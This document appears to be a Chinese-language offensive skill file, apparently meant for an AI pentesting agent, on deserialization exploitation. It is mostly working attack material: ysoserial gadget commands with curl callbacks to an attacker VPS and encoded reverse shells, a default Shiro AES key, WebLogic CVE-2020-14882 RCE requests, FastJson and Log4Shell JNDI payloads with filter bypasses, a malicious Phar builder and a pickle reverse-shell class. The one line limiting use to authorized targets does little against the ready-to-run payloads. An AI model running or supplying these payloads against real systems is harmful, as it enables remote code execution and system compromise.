---
name: 铜府·化形
description: >-
 Java/PHP/.NET 反序列化漏洞利用：ysoserial 链构造、常见框架（Shiro/WebLogic/FastJson/Jackson/Log4Shell）
 的反序列化 RCE、PHP/Python 反序列化。
version: 1.0.0
---

# 反序列化漏洞利用

## 作业入口（先跑这个）

- Java Cookie `rememberMe` → `记忆蛊.md` 
- Fastjson → `化形蛊.md` · `python3 炼蛊房/fastjson_probe.py --base https://授权站 --case <案卷>` 
- PHP Cookie `O:`/`a:` → `传承/化形.md` + `core_web_surface_probe.py` 
- Laravel `APP_KEY` → `php-debug-mode-exploitation` 

禁止用下面 ysoserial 命令对未授权目标发 RCE。授权内 L3 直接做。

## 触发条件

：
- Java 反序列化、ysoserial、gadget chain
- Shiro 反序列化、WebLogic T3/IIOP、JBoss
- FastJson 反序列化、Jackson 反序列化
- Log4j / Log4Shell（JNDI 注入）
- PHP unserialize、PHP POP 链
- .NET 反序列化、BinaryFormatter
- Python pickle 反序列化

---

## 1. Java 反序列化通用工具链

```bash
# ── ysoserial（通用 gadget 生成）──
# https://github.com/frohoff/ysoserial
java -jar ysoserial.jar <gadget> '<command>'

# 常用 gadget 链
java -jar ysoserial.jar CommonsCollections6 'curl http://你的VPS/$(id)' # 最通用
java -jar ysoserial.jar CommonsCollections1 'curl http://你的VPS/$(id)'
java -jar ysoserial.jar Spring1 'curl http://你的VPS/$(id)'
java -jar ysoserial.jar BeanShell1 'curl http://你的VPS/$(id)'
java -jar ysoserial.jar ROME 'curl http://你的VPS/$(id)'

# 生成反弹 shell 载荷
java -jar ysoserial.jar CommonsCollections6 \
 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' \
 | base64 -w 0
```

```python
# JRMP 监听（接受反连）
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'id'
```

---

## 2. Apache Shiro 反序列化

```bash
# 指纹：Cookie 中含 rememberMe 字段，响应头含 Set-Cookie: rememberMe=deleteMe

# ── ShiroExploit（自动化）──
python3 ShiroExploit.py -u http://target -g CC4

# ── 手工（shiro_exploit）──
git clone https://github.com/SummerSec/ShiroAttack2
# 支持 CB1、CC2、CC4 等多条 chain，自动爆破 key

# ── 关键：先找 AES 密钥 ──
# 常见默认/泄露 key：
# kPH+bIxk5D2deZiIxcaaaA== (Shiro <= 1.2.4 默认)
# 可用 ShiroKeyDB 爆破

# 手工构造（有 key）
import base64, uuid, subprocess
from Crypto.Cipher import AES

def encrypt_payload(payload_bytes, key):
 BS = AES.block_size
 pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
 iv = uuid.uuid4().bytes
 cipher = AES.new(key, AES.MODE_CBC, iv)
 return base64.b64encode(iv + cipher.encrypt(pad(payload_bytes)))
```

---

## 3. WebLogic 反序列化

```bash
# CVE-2019-2725 / CVE-2018-2628（T3 协议）
python3 weblogic_exploit.py -t http://target:7001/ -v 10.3.6 -c 'id'

# T3 协议检测
nmap -p 7001,7002 --script weblogic-t3-info target

# 常用工具：WeblogicScan、AntSword-WeblogicPlugin

# CVE-2020-14882（未授权 RCE，路径遍历）
curl 'http://target:7001/console/images/%252E%252E%252Fconsole.portal'
curl "http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"id\");')"
```

---

## 4. FastJson / Jackson 反序列化

```bash
# FastJson 特征：{"@type":"..."}

# FastJson ≤1.2.24 DNSLOG 检测
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://你的VPS:1389/Exploit","autoCommit":true}

# FastJson ≤1.2.47 无依赖链
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://你的VPS:1389/Exploit","autoCommit":true}}

# JNDI 利用服务（LDAP）
# marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://你的VPS:8888/#Exploit"
# 同时在 8888 端口 serve 恶意 class

# 或用 JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit.jar -C "bash -i >& /dev/tcp/VPS/4444 0>&1" -A VPS_IP
```

---

## 5. Log4Shell（CVE-2021-44228）

```bash
# 触发点：任何被 log4j 记录的字段（User-Agent、X-Forwarded-For、username 等）

# 检测（DNSLOG）
${jndi:ldap://你的DNSLOG.dnslog.cn/a}
${jndi:dns://你的DNSLOG.dnslog.cn/test}

# 绕过过滤
${${lower:j}ndi:${lower:l}dap://VPS/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://VPS/a}
${\u006a\u006e\u0064\u0069:ldap://VPS/a}

# 利用
java -jar JNDI-Exploit-Kit.jar -C "bash -i >& /dev/tcp/VPS/4444 0>&1" -A VPS_IP
# 发送 payload
curl -H 'User-Agent: ${jndi:ldap://VPS:1389/Exploit}' http://target/
curl -X POST http://target/login -d 'username=${jndi:ldap://VPS:1389/Exploit}&password=x'
```

---

## 6. PHP 反序列化

```php
// 构造 POP 链触发 __wakeup / __destruct
// 常见易受攻击的魔术方法：__wakeup / __destruct / __toString / __call

// Phar:// 反序列化（适用于文件操作函数）
// 生成恶意 phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new EvilClass(); // 目标链触发类
$phar->setMetadata($obj);
$phar->stopBuffering();
// 重命名为 evil.jpg 绕过扩展检测

// 触发点（任何接受文件路径的函数）
file_get_contents('phar://uploads/evil.jpg');
file_exists('phar://uploads/evil.jpg');
```

---

## 7. Python Pickle 反序列化

```python
import pickle, os, base64

class Exploit(object):
 def __reduce__(self):
 return (os.system, ('bash -i >& /dev/tcp/VPS/4444 0>&1',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# 发送 payload 到接受 pickle 的接口
```

---

## 8. .NET 反序列化

```bash
# 工具：ysoserial.net
# https://github.com/pwntester/ysoserial.net

# BinaryFormatter（已废弃但大量旧系统仍用）
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c calc"

# JSON.NET
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c calc"
```

---

## 快速检测清单

- [ ] 响应含 `rememberMe=deleteMe` → Shiro，试 AES key
- [ ] 含 `@type` → FastJson，构造 JNDI 链
- [ ] User-Agent/字段被 log4j 记录 → Log4Shell JNDI 检测
- [ ] 表单提交含 base64 → Java 序列化特征（`rO0AB`=`ac ed 00 05`）
- [ ] PHP `unserialize()` 接收外部输入 → POP 链 / Phar
- [ ] Python pickle 接口 → `__reduce__` 链

配套：`attack-chain` · `binary-pwn` · `evasion`

## 真源

- 工具：`python3 炼蛊房/java_web_surface_probe.py --help`
